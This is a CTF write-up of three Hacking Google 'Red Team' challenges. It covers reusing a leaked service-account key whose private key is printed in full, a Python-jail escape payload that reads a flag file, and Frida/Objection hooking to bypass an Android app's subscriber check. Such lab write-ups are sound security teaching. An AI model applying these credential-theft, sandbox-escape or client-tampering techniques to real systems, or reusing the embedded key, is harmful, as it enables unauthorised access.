---
description: "My writeup for EP003 of the Hacking Google CTF : Red Team."
authors:
  - techbrunch
date: 2022-10-20
links:
  - mobile/objection.md
  - mobile/frida.md
tags:
  - CTF
  - Reversing
categories:
  - WriteUp
---

# Hacking Google EP003 - Red Team

My writeup for EP003 of the Hacking Google CTF : Red Team.

<!-- more -->

### Challenge 01 - Multivision

> To make sure things are safe, sometimes, you need someone to break them.

> Blink and you'll miss it (9:29). Blink and you'll miss it again (15:09).

> Can you hunt down the secret corporate documents? socat FILE:`tty`,raw,echo=0 TCP:multivision.h4ck.ctfcompetition.com:1337

> Hint: Find the key, and put RFC 6749 to use


If we try to connect we are asked for a password:

```
❯ socat FILE:`tty`,raw,echo=0 TCP:multivision.h4ck.ctfcompetition.com:1337
== proof-of-work: disabled ==
Password:
a
failed authentication :(
```

If we look closely at the [Episode 3](https://www.youtube.com/watch?v=TusQWn2TQxQ) at [9:29](https://www.youtube.com/watch?v=TusQWn2TQxQ&t=569s) we can see the same login interface and at [15:09](https://youtu.be/TusQWn2TQxQ?t=909) a password on a Swiss Army Knife: `WhoPutMyPasswordH3r3`

```
❯ socat FILE:`tty`,raw,echo=0 TCP:multivision.h4ck.ctfcompetition.com:1337
== proof-of-work: disabled ==
Password:
WhoPutMyPasswordH3r3
*** Congratulations! ***
*** https://h4ck1ng.google/solve/1_w0nd3r_wh47_53cr3t5_l13_h3r3 ***
developer@googlequanta.com:/home/developer$ ls
backup.py  login.sh  todo.txt
```

Once logged in we can see three files in our home directory. A backup script missing a token, a bash script used for the first part of this challenge and a text file mentionning a sensitive document probably containing our flag.

=== "backup.py"

    ```python
    """
    [WIP]
    Regularly backup sensitive Google Drive files to disk
    """

    import json
    import requests
    from time import sleep

    doc_id = "1Z7CQDJhCj1G5ehvM3zB3FyxsCfdvierd1fs0UBlzFFM"

    def get_file(token, file_id):
        resp = requests.get(
            f'https://docs.googleapis.com/v1/documents/{file_id}',
            headers={'Authorization': f'Bearer {token}'},
        )
        file_content = ""
        if resp.status_code != 200:
            print(f"Yikes!\n{resp.text}")
        else:
            file_content = json.loads(resp.text)['body']
        return file_content

    def get_token():
        # TODO: I know it'll work with a 'documents.readonly' scope...
        # ...just need to get the access token
        pass

    # Backup file every hour
    while True:
        with open('backup.txt', 'a') as f:
            f.write(get_file(get_token(), doc_id))
        sleep(3600)
    ```

=== "login.sh"

    ```sh
    #!/bin/bash
    echo "Password: "
    read -r pass
    if [ $pass = 'WhoPutMyPasswordH3r3' ]
    then
      cd /home/developer
      echo '*** Congratulations! ***'
      echo '*** https://h4ck1ng.google/solve/1_w0nd3r_wh47_53cr3t5_l13_h3r3 ***'
      /bin/bash 2>&1
    else
      echo 'failed authentication :('
    fi
    exit
    ```

=== "todo.txt"

    ```
    Today
    [x] Added backup-tool@project-multivision.iam.gserviceaccount.com with viewer-access to super sensitive design doc
    [x] Tried activating service account with gcloud, but didn't give me a documents.readonly scope
    [x] Cleaned up service account key from disk before signing off

    Tomorrow
    [] Finish writing Google Drive backup script
    ```

The todo checklist says that the service account key was cleaned up from disk, let's see if this is true. Inside the home directory of the developper user we can see a `.config` folder:
```
developer@googlequanta.com:/home/developer/.config$ ls
gcloud
developer@googlequanta.com:/home/developer/.config$ cd gcloud/
developer@googlequanta.com:/home/developer/.config/gcloud$ ls
access_tokens.db  config_sentinel  credentials.db  legacy_credentials
active_config     configurations   gce             logs
```

In `credentials.db` we can find the service account key:

```json
{
  "client_email": "backup-tool@project-multivision.iam.gserviceaccount.com",
  "client_id": "105494657484877589161",
  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDEH/WQiLjqB2nn\ncMc+fBOMbq3SE75vkj9EqNWi+ilk+ChphklRGsGcVeFsuPp06WjN1d/knWw/f+0M\nPY3tli2oQIHuqLH5GIkVhm/xpdgZUbskO8EjSI3eIs+qCMcfObgeFSw7T29PorC3\nIuQDPTfIgo4oHA7UlEBE8mZVUnEXFDh/5sNFa+UzUE1QqpWymdRVhDHekxz0erWM\nc67Ovxti40X4LnSvHOBjinjMDdtmvXBel0mIzUQxjLp6hmTPoKD7PKUodSN2QaKA\nm+pQ6deWr5QvXTBc5XEXKpMnZnn4KqouJSic7jWGAOxY1iy/We4OWeUWDYiFBxZu\nZe+IZSL5AgMBAAECggEAGg1Kv9fBhGjWswUimlS9/gYHteOkhMqO9+5bboo/bGeg\naqAJZiohNMSdrKUHs/b7UnhKBOK6adby5JDapQgxaWukNtEWzwlo0ECq5xUKFxbp\nvn7ngWnWWn8SSbpfxPCUWf6jAP/kv9XTFoiedCWyHsLk4kQT3j4RKXdvi37ngdKU\ne+CTFCDIlSr7Q2MdcKMql8lRkjcW0kvY9w8+gVXbgl4M3bNMru2JlxNn2scaGXg0\nn/GbifMvbxYguCKhgTNH+t0N8vilVO8qUInvSDzQMSEZEycjxlsUgIAvrRy6QXT0\n4S1TbIARnrFC0g4zY0mg1EycuhO3OyeiM2KTweY7rwKBgQD3Kp2J6YsK2RuwktLb\n1pC2o0jYuOMSGCsjULzeqYkXHpmFY7iojd/g8FStPdJ+BanqcsZIUQf07zUxk5Xb\nDdwH+9Q2QpQahRc6GhwcySd3v79ZaAkZAO3r/QjF0OPLRLyvRXR8R5g25LYXL8Yk\nnLbAGfcVjyW5XGCZOsmnu72+9wKBgQDLIloXEJJjwa+QTnBhmkOv922q0sVRLOUY\nuj621qt09hgMTztepFsysBjJmDtAMOJpQott1G2m0wVkk7zdzmPFUvOMDc9/54y8\niqmBvoMBSLgWElp1vXvW7ICED/d11m6aOwIVKJvJtHvS5seAd8TzHSy+5FUPjG5m\naS5psPuBjwKBgQDtTtpBDp00Bi2iw+V1szXwVSfdBO7ncZMBbkRYmHgKXZPS0WL7\nWnRoWPdD+kZ+PtvcQOSFjF9SWNU+y0+nKVBnze77RcNDDyO04lq5fJzLSavjoJKT\nkiPdX22r2BrOECoFMm9b37WShtcZvgHFJz4DhSqJZY43wSzyEdKJnCTbEwKBgQDE\nz6ar3DGJl5pLXcRCvJ1CO5+0t3vYF4Bsgd7LdZgvvVQ1cPrbyrBVnwqVH/qgSfzD\n8WZ35i7LSH9cIEwIN7Sw9ZrkomjdyvGvp0VuYLA7KUK6l9OvagQ3i3NFANdJA5ar\ntephp7OxLT4fa9v1m5Vl22mEFmRXqT852ETQwFod/wKBgAgHdxxm1anORWoZVMhZ\nDgWAhJSWsYv1HPPx18NTwVt0GxBA+ssvg8ET7zDXd5E1vay533SaV4pk/w2mWsZU\nlbfS/vMslyg9GPpaKmhGVi6d3jr0xjgh5Vs72WCo2lAXvHwZNslB20SCmUzdP4nU\nrwrzx7aO6kKU+DHb9EoEN+LI\n-----END PRIVATE KEY-----\n",
  "private_key_id": "722d66d6da8d6d5356d73d04d9366a76c7ada494",
  "project_id": "project-multivision",
  "token_uri": "https://oauth2.googleapis.com/token",
  "type": "service_account"
}
```

I used the key with a [script from stackoverflow](https://stackoverflow.com/a/53926983/1447468) to get an OAuth access token.

Running the backup script with the missing token returned the flag: https://h4ck1ng.google/solve/4lr16h7_7h3n_k33p_y0ur_53cr375

### Challenge 02 - Shell Sprinter

> You got in, but can you get out? Better run fast. socat FILE:`tty`,raw,echo=0 TCP:shell-sprinter.h4ck.ctfcompetition.com:1337 (Shift+Q to quit)

> Hint: If you ain't cheating, you ain't trying

Once we connect to the service we are greated with a nice intro and in an ascii maze:

> You wake up in an unfamiliar place. Or rather, it seems familiar but somehow... not. Like a place you’ve visited a thousand times but now rendered in a dream. You’re in a dark corridor, your small orb of light illuminates only the faded green linoleum that drops away into blackness. You check your pockets. Nothing. You’re alone.
>
> You begin to walk, only to encounter... a blank wall. The smooth, cream facade blocks your way abruptly. You follow it, skirting the wall closely and discover a fork in the corridor. ‘Ok. This is a maze.’ As you pause to take stock you hear the knocking of even footsteps. They’re growing closer. The sound is innocuous, but you feel a surge of panic. It starts in the back of your head and washes over you in a hot wave. You’re not sure how, but you know it is time to leave. On an instinctual level, you know. It’s time to escape...

```
\\ @scape_986e080b ]=~~-###############################
\                                                     \
\                                                     \
\                                                     \
\                                                     \
\                                                     \
\                                                     \
\                                                     \
\               -----------                           \
\            |........|...|                           \
\                |....|...|                           \
\                |.@...@..|                           \
\            |........|...|                           \ Energy Level: Danger
\                -----|...|                           \
\                     |...---O       |---=----        \ )=[Inventory]=~--------
\                     |............. |.......|        \  1.
\                     ----..--- ------.....x.|        \  2.
\                       |............|.......|        \  3.
\                       |....-----...O.......O        \  4.
\                       |............|.......|        \  5.
\                       -------------|.......|        \  6.
\                                    |.......---------\  7.
\                                    |................\  8.
#######################################################
```

While the hint clearly says we should try to cheat I did explore the game to see how worked first. I did try some known cheatcode and checked if it was possible to hack the game itself but in vain so I checked the Discord and found out it was likely that we were meant to use the Konami Code which I already tried... Turns out I did not end the code with ++enter++ ><.

The Konami Code combination of keys was the following:

++arrow-up+arrow-up+arrow-down+arrow-down+arrow-left+arrow-right+arrow-left+arrow-right+b+a+enter++

Once entered we ended up in a Python Jail we need to espace:

```
\\ @_shell ]=~~-#######################################
\ print(__builtins__)                                 \
\ <module 'Sandbox'>                                  \
\                                                     \
#######################################################
 >>> [Enter - continue, r - return to game]
```

The payload size is limited to 70 characters. After checking HackTricks page on [how to bypass Python sandboxes](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#python3), I came up with a working payload:

```
#######################################################
 >>> print(print.__globals__['__builtins__'].open("./flag").read())
\\ @_shell ]=~~-#######################################
\ print(print.__globals__['__builtins__'].open("./fla \
\ https://h4ck1ng.google/solve/7h3_s1mul4crum_i5_7rue \
\                                                     \
\                                                     \
#######################################################
 >>> [Enter - continue, r - return to game]
```

### Challenge 03 - SecuCorgi

> This corgi made a mess, clean it up.

> Hint: Maybe support can help debug the subscriber problem?

We are [given an APK and a QR code image](https://storage.googleapis.com/gctf-h4ck-2022-attachments-project/3059807b8c613d0e1305237696307711cabf0ee9fb8401d878d32b7e99e5ba12a18e75062d0a9ba4cfc407a85c5b3bbe0a999d5ee7ef142ed4671b87f19a787b). Using the application we can scan the QR code but the flag is hidden to non subscribers.

The QR Code decodes to a website with the following information:

> SecuCorgi
> SecuCorgi is the world's most secure way to share images of corgis.
> You found a Corgi Code™️! Use the app to discover the cute corgi living at this link!

![SecuCorgi](hacking-google-red-team/secucorgi.png)

Let's see if we can solve the challenge using Corellium.

!!!info
    To run the application on [Corellium](https://www.corellium.com/) you will need to setup [OpenGApps](https://support.corellium.com/features/apps/opengapps) with a valid Google account. This is because the application is using [Google code scanner](https://developers.google.com/ml-kit/code-scanner?hl=en) which uses machine learning to scan the code on the device itself.

Once your device is ready on Corellium side you can use a VPN to access it. When connected to the VPN you can directly interact with the device as if it was on your network.

```
adb connect 10.11.1.1:5001
adb install challenge.apk
```

Once the app is installed you can run the application, make sure to start monitoring the network to see the HTTP traffic.

!!!warning
    You might need to click multiple times to scan the QR Code before it works. If Corellium cannot use your webcam consider switching to Chrome or Safari.

![](hacking-google-red-team/corellium-1.png)

In the network tab we can see the request and response being made, the response does not contains the flag so it's not just hidden by the application. We can replay the request and get the same response:

```
http get https://corgis-web.h4ck.ctfcompetition.com/corgi X-Document-ID:flag X-Request-Nonce:61c1871f7a3346eb0beca5ec4de3e2cdf542b6ef510a5d51eb5bc8c58e0d90b7 X-Timestamp:1666129650 X-Auth-MAC:5bd9d5a06b0e2c1529aca21d9efa02547561bb298cefe65ee3ffd5846f303ae4 User-Agent:okhttp/4.10.0
HTTP/1.1 200 OK
Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
Content-Length: 100
Content-Type: application/json
Date: Tue, 18 Oct 2022 21:48:28 GMT
Server: gunicorn
Via: 1.1 google

{
    "subscriberOnly": true,
    "text": "Secret message",
    "title": "Secret flag data",
    "url": "Subscribers Only"
}
```

We need to find the way to be considered a subscriber, let's analyse the APK for this. If we look for one of the headers in the decompiled code such as `X-Auth-MAC` we endup in the `NetworkKt.java` file:

```java hl_lines="8 10 23"
package google.h4ck1ng.secretcorgis;

import android.util.Base64;
...

public final class NetworkKt {
    private static final String DOC_ID_HEADER = "X-Document-ID";
    private static final String HMAC_SIG_HEADER = "X-Auth-MAC";
    private static final String NONCE_HEADER = "X-Request-Nonce";
    private static final String SUBSCRIBER_HEADER = "X-User-Subscribed";
    private static final String TAG = "Network";
    private static final String TIMESTAMP_HEADER = "X-Timestamp";

    public static final Object makeSecretRequest(CorgiRequest corgiRequest, Continuation<? super String> continuation) {
        Log.d(TAG, Intrinsics.stringPlus("Making request for ", corgiRequest));
        OkHttpClient okHttpClient = new OkHttpClient();
        Request.Builder url = new Request.Builder().url(corgiRequest.getCorgiServer());
        url.addHeader(DOC_ID_HEADER, corgiRequest.getCorgiId());
        url.addHeader(NONCE_HEADER, corgiRequest.getNonce());
        url.addHeader(TIMESTAMP_HEADER, corgiRequest.getTimestamp());
        url.addHeader(HMAC_SIG_HEADER, corgiRequest.getSignature());
        if (corgiRequest.isSubscriber()) {
            url.addHeader(SUBSCRIBER_HEADER, "true");
        }
        return BuildersKt.withContext(Dispatchers.getIO(), new NetworkKt$makeSecretRequest$2(okHttpClient, url.build(), null), continuation);
    }
```

It looks like we could simply set `X-User-Subscribed` to `true` to be considered a subscriber, but if we do that without changing the other headers we get a `401 Unauthorized` error.

```
http get https://corgis-web.h4ck.ctfcompetition.com/corgi X-Document-ID:flag X-Request-Nonce:61c1871f7a3346eb0beca5ec4de3e2cdf542b6ef510a5d51eb5bc8c58e0d90b7 X-Timestamp:1666129650 X-Auth-MAC:5bd9d5a06b0e2c1529aca21d9efa02547561bb298cefe65ee3ffd5846f303ae4 User-Agent:okhttp/4.10.0 X-User-Subscribed:true
HTTP/1.1 401 UNAUTHORIZED
Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
Content-Length: 318
Content-Type: text/html; charset=utf-8
Date: Tue, 18 Oct 2022 21:56:28 GMT
Server: gunicorn
Via: 1.1 google

<!doctype html>
<html lang=en>
<title>401 Unauthorized</title>
<h1>Unauthorized</h1>
<p>The server could not verify that you are authorized to access the URL requested. You either supplied the wrong credentials (e.g. a bad password), or your browser doesn&#x27;t understand how to supply the credentials required.</p>
```

This means that there is some kind of signature that we need to reverse... or we could just use [Objection](/mobile/objection/) to change the return value of the `isSubscriber` function :)

With objection this is just one command:

```
android hooking set return_value google.h4ck1ng.secretcorgis.CorgiRequest.isSubscriber true
```

Before using objection we need to attach Frida to the process of our application:

![Attach Frida to process](hacking-google-red-team/corellium-2.png)

!!!warning
        Make sure that the version of Frida you have installed locally is the same as the one used by Corellium or it won't work.

Now if we can a QR code again the value will be replaced by true and the other headers will be updated:

```
Objection -g google.h4ck1ng.secretcorgis explore                                                                                                     ─╯

Using USB device `Corellium Generic`
Agent injected and responds ok!

     _   _         _   _
 ___| |_|_|___ ___| |_|_|___ ___
| . | . | | -_|  _|  _| | . |   |
|___|___| |___|___|_| |_|___|_|_|
      |___|(object)inject(ion) v1.11.0

     Runtime Mobile Exploration
        by: @leonjza from @sensepost

[tab] for command suggestions
google.h4ck1ng.secretcorgis on (Android: 12) [usb] # android hooking set return_value google.h4ck1ng.secretcorgis.CorgiRequest.isSubscriber true
(agent) Attempting to modify return value for class google.h4ck1ng.secretcorgis.CorgiRequest and method isSubscriber.
(agent) Hooking google.h4ck1ng.secretcorgis.CorgiRequest.isSubscriber()
(agent) Registering job 647615. Type: set-return for: google.h4ck1ng.secretcorgis.CorgiRequest.isSubscriber
google.h4ck1ng.secretcorgis on (Android: 12) [usb] # (agent) [647615] Return value was not true, setting to true.
(agent) [647615] Return value was not true, setting to true.
(agent) [647615] Return value was not true, setting to true.
```

We are now a subscriber and we can find the flag `c0rg15_4nd_th3ir_s3cr3ts_4r3_cu73` in the response !

![](hacking-google-red-team/corellium-3.png)